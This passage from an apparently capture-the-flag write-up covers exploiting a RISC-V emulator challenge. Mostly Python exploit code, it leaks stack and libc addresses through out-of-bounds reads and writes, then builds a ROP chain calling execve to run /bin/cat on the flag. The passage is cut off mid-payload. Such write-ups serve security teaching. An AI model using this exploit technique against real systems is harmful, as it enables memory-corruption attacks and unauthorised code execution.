</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mh">0x58</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set a3 = mem[t2]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_LD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mh">0x0</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">))</span> <span class="c1"># a3 = mem[t2]. Observation via gdb, mem[t2] contains libc address. Now, a3 contains libc address</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">82</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">),</span> <span class="mh">0xf00</span><span class="p">)</span> <span class="c1"># Subtract it by 0x100</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">),</span> <span class="mh">0xf30</span><span class="p">)</span> <span class="c1"># subtract it by 0xd0. Now, a3 == libc_base</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I try to set t2 to <code>0x800ffd58</code> (which is <code>0x80100000-0x2a8</code>), and then use <code>exec_LD</code> to get the leak and store it in <code>a3</code>. And then, with the help of <code>exec_ADDI</code>, I try to subtract it by <code>0x100</code> step by step until the <code>a3</code> value equals to libc base address.</p>
<p>Now that we know how to do OOB read and write, the exploitation is trivial. Notice that in <code>server.py</code> file, the <code>stdin</code> is redirected to <code>DEVNULL</code>, so we can&rsquo;t spawn a shell.</p>
<p>I choose to create a ROP payload to call <code>execve('/bin/cat', ['/bin.cat', 'flag'])</code>. With the OOB read, we know the stack and libc address, and with the OOB write, we can carefully build the <code>argv</code> array in the stack, and then pass the stack address during the call to <code>execve</code>. Below is the ROP payload to execute that.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set t0 = 0x800ffff0. We will use this as the address of /bin/cat</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="mh">0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="mh">0x0f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="mh">0xff</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="mh">0xf0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set a0 = 0x7461632f6e69622f (&#39;/bin/cat&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x74</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x61</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x63</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x2f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x6e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x69</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x62</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x2f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Store &#39;/bin/cat&#39; in mem[t0] (which resides in stack)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">))</span> <span class="c1"># mem[t0] = a0 = &#39;/bin/cat&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;s11&#39;</span><span class="p">))</span> <span class="c1"># mem[t0+0x8] = s11 = 0 (Add null terminator for /bin/cat string)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set a1 = 0x67616c66 (&#39;flag&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="mh">0x67</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="mh">0x61</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="mh">0x6c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">),</span> <span class="mh">0x66</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Store &#39;flag&#39; in mem[t0+0x10]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t0&#39;</span><span class="p">),</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">))</span> <span class="c1"># mem[t0+0x10] = a1 = &#39;flag&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set t1 = 0x800fffd0. We will use this as the address of pointer to argv</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="mh">0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="mh">0x0f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="mh">0xff</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="mh">0xd0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set a2 = stack address of argv[0] (string &#39;/bin/cat&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_LD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;sp&#39;</span><span class="p">),</span> <span class="mh">0x58</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a2&#39;</span><span class="p">))</span> <span class="c1"># a2 = mem[sp+0x58]. Observation via gdb, mem[sp+0x58] contains stack address value</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a2&#39;</span><span class="p">),</span> <span class="mh">0xef0</span><span class="p">)</span>  <span class="c1"># Subtract the leaked value by 0x120. Now, a2 = stack address of argv[0] (address of mem[t0])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;s0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a2&#39;</span><span class="p">),</span> <span class="mh">0x0</span><span class="p">)</span> <span class="c1"># s0 = a2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;s1&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a2&#39;</span><span class="p">),</span> <span class="mh">0xfe0</span><span class="p">)</span> <span class="c1"># s1 = a2-0x20, which is the address of mem[t1] (pointer to argv)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Build argv payload</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;s0&#39;</span><span class="p">))</span> <span class="c1"># mem[t1] = s0 = argv[0]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;s0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;s0&#39;</span><span class="p">),</span> <span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;s0&#39;</span><span class="p">))</span> <span class="c1"># mem[t1+0x8] = s0+0x10 = argv[1]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">),</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;s11&#39;</span><span class="p">))</span> <span class="c1"># mem[t1+0x10] = s11 = NULL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set t2 = 0x800ffd58. We will use this to leak libc base</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mh">0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mh">0x0f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mh">0xfd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mh">0x58</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set a3 = mem[t2]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_LD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mh">0x0</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">))</span> <span class="c1"># a3 = mem[t2]. Observation via gdb, mem[t2] contains libc address. Now, a3 contains libc address</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">82</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">),</span> <span class="mh">0xf00</span><span class="p">)</span> <span class="c1"># Subtract it by 0x100</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">),</span> <span class="mh">0xf30</span><span class="p">)</span> <span class="c1"># subtract it by 0xd0. Now, a3 == libc_base</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set a4 = pop_rdi</span>
